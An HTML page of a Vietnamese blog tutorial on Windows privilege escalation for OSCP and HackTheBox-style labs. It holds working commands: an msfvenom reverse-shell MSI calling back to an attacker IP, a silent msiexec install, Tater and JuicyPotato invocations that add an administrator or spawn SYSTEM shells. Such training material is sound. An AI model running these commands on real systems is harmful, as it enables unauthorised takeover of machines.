<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ... | minhtuanact|Blog - Keep a flame in the rain!</title>
<meta name=keywords content="Privilege Escalation,windows,Kernel Exploits,Stored Credentials,Hot Potato"><meta name=description content="Giới thiệu
Gần một tháng trước mình có public 1 bài Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits
. Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.

Bài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên hackthebox.eu hay Vulnhub, &mldr;"><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.e4f77e49b7bc8b49af2e5878ca22d15ad5c140fc859ce62cca1a9e772333eb5e.css integrity="sha256-5Pd+Sbe8i0mvLlh4yiLRWtXBQPyFnOYsyhqedyMz614=" rel="preload stylesheet" as=style><link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/"><meta property="og:site_name" content="minhtuanact|Blog - Keep a flame in the rain!"><meta property="og:title" content="Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ..."><meta property="og:description" content="Giới thiệu Gần một tháng trước mình có public 1 bài Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits . Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.
Bài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên hackthebox.eu hay Vulnhub, …"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-08-03T09:01:12+07:00"><meta property="article:modified_time" content="2020-08-03T09:01:12+07:00"><meta property="article:tag" content="Privilege Escalation"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Kernel Exploits"><meta property="article:tag" content="Stored Credentials"><meta property="article:tag" content="Hot Potato"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ..."><meta name=twitter:description content="Giới thiệu
Gần một tháng trước mình có public 1 bài Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits
. Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.

Bài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên hackthebox.eu hay Vulnhub, &mldr;"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ...","item":"https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ...","name":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ...","description":"Giới thiệu Gần một tháng trước mình có public 1 bài Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits . Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.\nBài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên hackthebox.eu hay Vulnhub, \u0026hellip;\n","keywords":["Privilege Escalation","windows","Kernel Exploits","Stored Credentials","Hot Potato"],"articleBody":"Giới thiệu Gần một tháng trước mình có public 1 bài Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits . Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.\nBài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên hackthebox.eu hay Vulnhub, …\nBài viết này được dựa theo khoá học Windows Privilege Escalation for OSCP \u0026 Beyond! trên Udemy và Windows / Linux Local Privilege Escalation Workshop của sagishahar.\nStored Credentials Password Nguyên nhân Đôi khi việc leo thang đặc quyền nó dễ như việc tìm thấy mật khẩu của Administrator, và đôi khi có một số vị trí và vài phương pháp phổ biến để tìm kiếm mật khẩu trên Windows. Chúng ta có thể tìm thấy trong registry hoặc trong các file trong hệ thống có chứa username và password Khai thác Vậy khi có username và password rồi thì có thể switch sang user đó theo bài viết mình đã viết tại\nLàm thế nào để chuyển đổi tài khoản trên Windows (How do I switch users in Windows)? Mình đánh giá kiểu khai thác này vừa dễ vừa khó, dễ là có thể tìm được ngay password của Administrator, còn khó là việc tìm password Administrator được giấu rất kỹ và giải mã rất lằng nhằng thì nó quả thực là rất khó.\nVí dụ 1: https://www.youtube.com/watch?v=UJ3rK8PyY_w\nVí dụ 2: https://www.youtube.com/watch?v=2fF4Xre-w2g\nVí dụ 3: https://www.youtube.com/watch?v=sm9xgpgaEQw\nKernel Exploits Windows Kernel Exploitation Nguyên nhân Với việc OS được update thường xuyên thì việc khai thác qua kernel dường như là bất khả thi, tuy nhiên chúng ta vẫn cần kiểm tra Kernel của Windows. Có thể sử dụng Watson để kiểm tra xem có lỗ hổng nào chưa được vá. Watson đã được tích hợp bên trong winPEAS rồi. Trong trường hợp phát hiện ra lỗ hổng nào với kernel, sử dụng kho lưu trữ https://github.com/SecWiki/windows-kernel-exploits để kiểm tra và khai thác. Nếu cần biên dịch code C thì có thể sử dụng Kali để biên dịch rồi upload lên machine\nHoặc cũng có thể sử dụng Windows-Exploit-Suggester bằng cách lưu lại systeminfo rồi chạy đoạn mã này sẽ cho ra được những gợi ý để khai thác Kernel. Tuy nhiên, với khá nhiều lỗi Kernel đến từ Windows, việc khai thác này rất mất thời gian vì mỗi lần chạy Windows-Exploit-Suggester mình được nó gợi ý ra khoảng 100 cái mã khai thác, thật là đáng sợ :'(\nKhai thác Ví dụ: https://medium.com/@ranakhalil101/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb Ví dụ 2: https://youtu.be/HTM-BavQvs4\nOptions Install Windows Always Install Elevated Nguyên nhân Windows có thể cho phép low privilege users có quyền cài đặt Microsoft Windows Installer Package (MSI) với quyền SYSTEM bởi AlwaysInstallElevated group policy.\nKhai thác Sử dụng đặc quyền được cài đặt MSI của users quyền thấp, attacker có thể tạo một chương trình MSI chứa payload độc hại để leo lên quyền SYSTEM.\nKiểm ra việc AlwaysInstallElevated có được bật với user hiện tại, sử dụng winPEAS.exe Sử dụng msfvenom để tạo payload với format file MSI 1 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=8080 -f msi -o evil.msi Đẩy file evil.msi lên machine và sử dụng câu lệnh sau để cài đặt\n1 msiexec /quiet /qn /i C:\\temp\\evil.msi (Nhớ trước khi cài đặt thực hiện lắng nghe trên cổng đã khai báo)\nVí dụ video: https://youtu.be/9LpsofQN_ao\nScheduled Tasks Nguyên nhân Các chương trình được lập lịch (scheduled) được khai thác giống với Linux (khai thác với crontab), việc khai thác với Scheduled Tasks khá là khó khăn, tuy nhiên nếu có thể tìm thấy một tệp hoặc chương trình nào đó đang chạy như một phần của tác vụ theo scheduled thì vẫn có thể leo thang đặc quyền.\nKhai thác Việc khai thác thì cũng tùy vào những case cụ thể. Ví dụ 2 trường hợp bên dưới:\nhttps://www.youtube.com/watch?v=J-GlK59M0Yw\nhttps://youtu.be/Kgga91U3B4s\nHot Potato Nguyên nhân Là một lỗi trong Windows, khai thác qua NTLM relay (specifically HTTP-\u003eSMB relay) và NBNS spoofing. Cụ thể cách khai thác được viết đầy đủ tại https://github.com/foxglovesec/Potato\nKhai thác Sử dụng module Tater được download tại https://github.com/Kevin-Robertson/Tater để khai thác. Thực hiện khởi động powershell noprofile\n1 powershell -ep bypass -nop Import module Tater\n1 Import-Module .\\Tater.ps1 Gọi function Tater để tiến hành khai thác\n1 Invoke-Tater -Trigger 1 -Command \"net user user /add \u0026\u0026 net localgroup administrators tater /add\" Khai thác xong tiến hành kiểm tra tài khoản user đã được thêm vào group Administrator hay chưa Hoặc có thể thay đổi câu command net user user /add \u0026\u0026 net localgroup administrators tater /add thành thực thi file reverse exe cũng được, lúc đó chúng ta sẽ có SYSTEM.\nJuicy Potato (abusing the golden privileges) Nguyên nhân Các bạn có thể đọc nguyên nhân tại sao và do đâu ở đây Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM\nĐể phát hiện ra lỗi này, các bạn có thể chạy lệnh whoami /all để kiểm tra xem mode SeImpersonate hoặc SeAssignPrimaryToken đang được bật hay không.\nSau đó, chúng ta có thể lạm dụng một vài cổng COM với CLSID có thể lên được quyền SYSTEM.\nKhai thác Sử dụng file binary download tại https://github.com/ohpe/juicy-potato/releases\nUpload file JuicyPotato.exe lên machine.\nLấy mã CLSID tuỳ thuộc vào OS có tại Windows CLSID Sử dụng\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 - T:\\\u003eJuicyPotato.exe JuicyPotato v0.1 Mandatory args: -t createprocess call: CreateProcessWithTokenW, CreateProcessAsUser, \u003c*\u003e try both -p : program to launch -l : COM server listen port Optional args: -m : COM server listen address (default 127.0.0.1) -a : command line argument to pass to program (default NULL) -k : RPC server ip address (default 127.0.0.1) -n : RPC server listen port (default 135) -c \u003c{clsid}\u003e: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) -z only test CLSID and print token's user Ví dụ: Machine của bạn là Win 7 Enterprise ta lấy được mã CLSID là {555F3418-D99E-4E51-800A-6E89CFD8B1D7}, sử dụng JuicyPotato.exe.\n./JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}\nCó thể thay c:\\windows\\system32\\cmd.exe bằng file reverse shell exe để lấy SYSTEM.\nKết Vậy là mình đã trình bày các cách leo thang đặc quyền trên Windows, còn một vài cách lên SYSTEM trên Windows nữa khai thác Active Directory dự định mình sẽ viết vào bài sau. Cảm ơn bạn đọc đã theo dõi :).\n","wordCount":"1083","inLanguage":"en","image":"https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2020-08-03T09:01:12+07:00","dateModified":"2020-08-03T09:01:12+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-2-stored-credentials-kernel-exploits-scheduled-tasks/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li><li><a href=https://minhtuanact.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Leo thang đặc quyền trong Windows - Windows Privilege Escalation #2: Stored Credentials, Kernel Exploits, Scheduled Tasks, ...</h1><div class=post-meta><span title='2020-08-03 09:01:12 +0700 +0700'>August 3, 2020</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#gi%e1%bb%9bi-thi%e1%bb%87u aria-label="Giới thiệu">Giới thiệu</a></li><li><a href=#stored-credentials aria-label="Stored Credentials">Stored Credentials</a><ul><li><a href=#password aria-label=Password>Password</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c aria-label="Khai thác">Khai thác</a></li></ul></li></ul></li><li><a href=#kernel-exploits aria-label="Kernel Exploits">Kernel Exploits</a><ul><li><a href=#windows-kernel-exploitation aria-label="Windows Kernel Exploitation">Windows Kernel Exploitation</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-1 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-1 aria-label="Khai thác">Khai thác</a></li></ul></li></ul></li><li><a href=#options-install-windows aria-label="Options Install Windows">Options Install Windows</a><ul><li><a href=#always-install-elevated aria-label="Always Install Elevated">Always Install Elevated</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-2 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-2 aria-label="Khai thác">Khai thác</a></li></ul></li></ul></li><li><a href=#scheduled-tasks aria-label="Scheduled Tasks">Scheduled Tasks</a><ul><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-3 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-3 aria-label="Khai thác">Khai thác</a></li></ul></ul></li><li><a href=#hot-potato aria-label="Hot Potato">Hot Potato</a><ul><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-4 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-4 aria-label="Khai thác">Khai thác</a></li></ul></ul></li><li><a href=#juicy-potato-abusing-the-golden-privileges aria-label="Juicy Potato (abusing the golden privileges)">Juicy Potato (abusing the golden privileges)</a><ul><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-5 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-5 aria-label="Khai thác">Khai thác</a></li></ul></ul></li><li><a href=#k%e1%ba%bft aria-label=Kết>Kết</a></li></ul></div></details></div><div class=post-content><h1 id=giới-thiệu>Giới thiệu<a hidden class=anchor aria-hidden=true href=#giới-thiệu>#</a></h1><p>Gần một tháng trước mình có public 1 bài <a href=https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj>Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits
</a>. Để tiếp tục series này, nay mình viết tiếp các cách khai thác đặc quyền trên Windows.</p><blockquote><p>Bài viết hướng đến cho mọi người cách nhìn tổng quan về leo quyền trên Windows, các bạn có thể gặp nó trong các cuộc thi như OSCP, OSWE, các labs trên <a href=https://hackthebox.eu/>hackthebox.eu</a> hay <a href=http://vulnhub.com/>Vulnhub</a>, &mldr;</p></blockquote><p>Bài viết này được dựa theo khoá học <a href=https://www.udemy.com/course/windows-privilege-escalation>Windows Privilege Escalation for OSCP & Beyond!
</a>trên <strong>Udemy</strong> và <a href=https://github.com/sagishahar/lpeworkshop>Windows / Linux Local Privilege Escalation Workshop
</a>của <strong>sagishahar</strong>.</p><h1 id=stored-credentials>Stored Credentials<a hidden class=anchor aria-hidden=true href=#stored-credentials>#</a></h1><h2 id=password>Password<a hidden class=anchor aria-hidden=true href=#password>#</a></h2><h3 id=nguyên-nhân>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân>#</a></h3><p>Đôi khi việc leo thang đặc quyền nó dễ như việc tìm thấy mật khẩu của Administrator, và đôi khi có một số vị trí và vài phương pháp phổ biến để tìm kiếm mật khẩu trên Windows.
Chúng ta có thể tìm thấy trong registry hoặc trong các file trong hệ thống có chứa username và password
<img loading=lazy src=https://images.viblo.asia/42abf820-1091-41d3-bd8f-8d3f1de44c9d.png></p><h3 id=khai-thác>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác>#</a></h3><p>Vậy khi có username và password rồi thì có thể switch sang user đó theo bài viết mình đã viết tại<br><a href=https://viblo.asia/p/lam-the-nao-de-chuyen-doi-tai-khoan-tren-windows-how-do-i-switch-users-in-windows-YWOZrQppKQ0>Làm thế nào để chuyển đổi tài khoản trên Windows (How do I switch users in Windows)?</a></p><p>Mình đánh giá kiểu khai thác này vừa dễ vừa khó, dễ là có thể tìm được ngay password của Administrator, còn khó là việc tìm password Administrator được giấu rất kỹ và giải mã rất lằng nhằng thì nó quả thực là rất khó.</p><blockquote><p>Ví dụ 1: <a href="https://www.youtube.com/watch?v=UJ3rK8PyY_w">https://www.youtube.com/watch?v=UJ3rK8PyY_w</a></p><p>Ví dụ 2: <a href="https://www.youtube.com/watch?v=2fF4Xre-w2g">https://www.youtube.com/watch?v=2fF4Xre-w2g</a></p><p>Ví dụ 3: <a href="https://www.youtube.com/watch?v=sm9xgpgaEQw">https://www.youtube.com/watch?v=sm9xgpgaEQw</a></p></blockquote><h1 id=kernel-exploits>Kernel Exploits<a hidden class=anchor aria-hidden=true href=#kernel-exploits>#</a></h1><h2 id=windows-kernel-exploitation>Windows Kernel Exploitation<a hidden class=anchor aria-hidden=true href=#windows-kernel-exploitation>#</a></h2><h3 id=nguyên-nhân-1>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-1>#</a></h3><p>Với việc OS được update thường xuyên thì việc khai thác qua kernel dường như là bất khả thi, tuy nhiên chúng ta vẫn cần kiểm tra Kernel của Windows. Có thể sử dụng Watson để kiểm tra xem có lỗ hổng nào chưa được vá. Watson đã được tích hợp bên trong winPEAS rồi. Trong trường hợp phát hiện ra lỗ hổng nào với kernel, sử dụng kho lưu trữ <a href=https://github.com/SecWiki/windows-kernel-exploits>https://github.com/SecWiki/windows-kernel-exploits</a> để kiểm tra và khai thác. Nếu cần biên dịch code C thì có thể sử dụng Kali để biên dịch rồi upload lên machine</p><p>Hoặc cũng có thể sử dụng <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> bằng cách lưu lại systeminfo rồi chạy đoạn mã này sẽ cho ra được những gợi ý để khai thác Kernel. Tuy nhiên, với khá nhiều lỗi Kernel đến từ Windows, việc khai thác này rất mất thời gian vì mỗi lần chạy <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> mình được nó gợi ý ra khoảng 100 cái mã khai thác, thật là đáng sợ :'(</p><h3 id=khai-thác-1>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-1>#</a></h3><p>Ví dụ: <a href=https://medium.com/@ranakhalil101/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb>https://medium.com/@ranakhalil101/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb</a>
Ví dụ 2: <a href=https://youtu.be/HTM-BavQvs4>https://youtu.be/HTM-BavQvs4</a></p><h1 id=options-install-windows>Options Install Windows<a hidden class=anchor aria-hidden=true href=#options-install-windows>#</a></h1><h2 id=always-install-elevated>Always Install Elevated<a hidden class=anchor aria-hidden=true href=#always-install-elevated>#</a></h2><h3 id=nguyên-nhân-2>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-2>#</a></h3><p>Windows có thể cho phép low privilege users có quyền cài đặt Microsoft Windows Installer Package (MSI) với quyền SYSTEM bởi AlwaysInstallElevated group policy.</p><h3 id=khai-thác-2>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-2>#</a></h3><p>Sử dụng đặc quyền được cài đặt MSI của users quyền thấp, attacker có thể tạo một chương trình MSI chứa payload độc hại để leo lên quyền SYSTEM.</p><p>Kiểm ra việc AlwaysInstallElevated có được bật với user hiện tại, sử dụng winPEAS.exe
<img loading=lazy src=https://images.viblo.asia/2f19926a-c90f-4cc1-898f-d96f61a2dd59.png></p><p>Sử dụng msfvenom để tạo payload với format file MSI
<img loading=lazy src=https://images.viblo.asia/45129b7b-7f9d-45a7-af92-d75e333bbb87.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>msfvenom -p windows/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.5 <span class=nv>LPORT</span><span class=o>=</span><span class=m>8080</span> -f msi -o evil.msi
</span></span></code></pre></td></tr></table></div></div><p>Đẩy file <code>evil.msi</code> lên machine và sử dụng câu lệnh sau để cài đặt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>msiexec /quiet /qn /i C:<span class=se>\t</span>emp<span class=se>\e</span>vil.msi
</span></span></code></pre></td></tr></table></div></div><p>(Nhớ trước khi cài đặt thực hiện lắng nghe trên cổng đã khai báo)</p><blockquote><p>Ví dụ video: <a href=https://youtu.be/9LpsofQN_ao>https://youtu.be/9LpsofQN_ao</a></p></blockquote><h1 id=scheduled-tasks>Scheduled Tasks<a hidden class=anchor aria-hidden=true href=#scheduled-tasks>#</a></h1><h3 id=nguyên-nhân-3>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-3>#</a></h3><p>Các chương trình được lập lịch (scheduled) được khai thác giống với Linux (khai thác với crontab), việc khai thác với Scheduled Tasks khá là khó khăn, tuy nhiên nếu có thể tìm thấy một tệp hoặc chương trình nào đó đang chạy như một phần của tác vụ theo scheduled thì vẫn có thể leo thang đặc quyền.</p><h3 id=khai-thác-3>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-3>#</a></h3><p>Việc khai thác thì cũng tùy vào những case cụ thể. Ví dụ 2 trường hợp bên dưới:</p><p><a href="https://www.youtube.com/watch?v=J-GlK59M0Yw">https://www.youtube.com/watch?v=J-GlK59M0Yw</a></p><p><a href=https://youtu.be/Kgga91U3B4s>https://youtu.be/Kgga91U3B4s</a></p><h1 id=hot-potato>Hot Potato<a hidden class=anchor aria-hidden=true href=#hot-potato>#</a></h1><h3 id=nguyên-nhân-4>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-4>#</a></h3><p>Là một lỗi trong Windows, khai thác qua NTLM relay (specifically HTTP->SMB relay) và NBNS spoofing. Cụ thể cách khai thác được viết đầy đủ tại <a href=https://github.com/foxglovesec/Potato>https://github.com/foxglovesec/Potato</a></p><h3 id=khai-thác-4>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-4>#</a></h3><p>Sử dụng module Tater được download tại <a href=https://github.com/Kevin-Robertson/Tater>https://github.com/Kevin-Robertson/Tater</a> để khai thác.
Thực hiện khởi động powershell noprofile</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>powershell -ep bypass -nop
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/11063aea-cc04-43e9-9bb1-f032de6d9e8c.png></p><p>Import module Tater</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Import-Module .\Tater.ps1
</span></span></code></pre></td></tr></table></div></div><p>Gọi function Tater để tiến hành khai thác</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Invoke-Tater -Trigger 1 -Command &#34;net user user /add &amp;&amp; net localgroup administrators tater /add&#34;
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/1fd5bc0e-b873-4859-b8df-cfe713d0b3d4.png></p><p>Khai thác xong tiến hành kiểm tra tài khoản user đã được thêm vào group Administrator hay chưa
<img loading=lazy src=https://images.viblo.asia/88212334-881d-482b-85e6-46071ce8ab4c.png></p><p>Hoặc có thể thay đổi câu command <code>net user user /add && net localgroup administrators tater /add</code> thành thực thi file reverse exe cũng được, lúc đó chúng ta sẽ có SYSTEM.</p><h1 id=juicy-potato-abusing-the-golden-privileges>Juicy Potato (abusing the golden privileges)<a hidden class=anchor aria-hidden=true href=#juicy-potato-abusing-the-golden-privileges>#</a></h1><h3 id=nguyên-nhân-5>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-5>#</a></h3><p>Các bạn có thể đọc nguyên nhân tại sao và do đâu ở đây <a href=https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM</a></p><p>Để phát hiện ra lỗi này, các bạn có thể chạy lệnh <code>whoami /all</code> để kiểm tra xem mode <code>SeImpersonate</code> hoặc <code>SeAssignPrimaryToken</code> đang được bật hay không.<br>Sau đó, chúng ta có thể lạm dụng một vài cổng COM với CLSID có thể lên được quyền SYSTEM.</p><h3 id=khai-thác-5>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-5>#</a></h3><ul><li><p>Sử dụng file binary download tại <a href=https://github.com/ohpe/juicy-potato/releases/tag/v0.1>https://github.com/ohpe/juicy-potato/releases</a></p></li><li><p>Upload file JuicyPotato.exe lên machine.</p></li><li><p>Lấy mã CLSID tuỳ thuộc vào OS có tại <a href=https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md>Windows CLSID</a></p></li><li><p>Sử dụng</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>- T:<span class=se>\&gt;</span>JuicyPotato.exe
</span></span><span class=line><span class=cl>JuicyPotato v0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mandatory args:
